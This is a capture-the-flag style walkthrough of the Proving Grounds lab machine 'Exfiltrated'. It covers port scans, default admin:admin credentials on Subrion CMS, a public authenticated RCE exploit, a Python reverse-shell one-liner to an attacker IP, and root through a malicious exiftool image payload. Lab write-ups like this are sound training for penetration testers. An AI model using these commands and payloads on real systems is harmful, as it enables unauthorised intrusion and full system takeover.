---
title: Proving Grounds - Exfiltrated
date: 2022-08-08 12:37:00 -500 
categories: [Proving Grounds]
tags: [oscp,linux]
---

# Exfiltrated Overview

## Machine Details

|IP|Hostname|Operating System|
|---|---|---|
|192.168.x.163|Exfiltrated|Linux|

## Path to Exploitation
This is a Linux machine running an HTTP server and has SSH available. We will identify the vulnerable web-application and using a publicly available exploit and default credentials we obtain a web-shell and get command execution. Once on the machine we identify a scheduled script that takes uploaded images and executes the exiftools command on them. We can leverage this by uploading a .jpg file with an embedded reverse shell payload.

# Enumeration

## Full Port Scan

```bash
$ nmap 192.168.109.163 -p- -oA Exfiltrated/nmap/full-port --open -Pn -vv
```

Results:

|PORT|SERVICE|
|----|-------|
|22|ssh|
|80|http|

## Service Scan

```bash
$ nmap 192.168.109.163 -p 22,80 -sC -sV -oA Exfiltrated/nmap/service-scan -Pn
```

Results:

|PORT|SERVICE|VERSION|
|----|-------|-------|
|22|ssh|8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)|
|80|http|httpd 2.4.41 ((Ubuntu))|

# Website Enumeration

![Web Application](/assets/ProvingGrounds/Exfiltarted/site-landing-page.png "Site Page")

We see the server is running Subrion CMS 4.2.1 which has an [Authenticated RCE](https://www.exploit-db.com/exploits/49876). We can guess the default credentials admin:admin and see that we can now login to the application

![Valid Credentials](/assets/ProvingGrounds/Exfiltarted/valid-creds.png "Valid Credentials")

We can now use the exploit and supply it the credentials for the application

```bash
$ python3 exploit.py -u http://192.168.109.163/panel/ -l admin -p admin 
```

And we see that we have command execution on the box

![Command Execution](/assets/ProvingGrounds/Exfiltarted/command-exec.png "Confirmed Command Exec")

We can get a reverse shell by setting up a listener and running the following python command
```python
python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.109",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
```

# Privilege Escalation
We inspect the content of /opt/image-exif.sh and see the following code.

![Script Content](/assets/ProvingGrounds/Exfiltarted/script-content.png "Script Content")

We see that the code is taking images from the site's upload directory and running exiftools on it. We can inject a malicious command into a jpg file attempt to get a reverse shell when exfitools executes. We can use the exploit located [here](https://www.exploit-db.com/exploits/50911) to generate our malicious jpg.

```bash
$ python3 exif-exploit.py -s 192.168.49.109 443
```

![Exploit](/assets/ProvingGrounds/Exfiltarted/exploit.png "Exploit")

We now upload our image to the site's upload directory, setup a listener and wait to catch the shell

![Root Shell](/assets/ProvingGrounds/Exfiltarted/root-shell.png "Root Shell")

And we now have a root shell

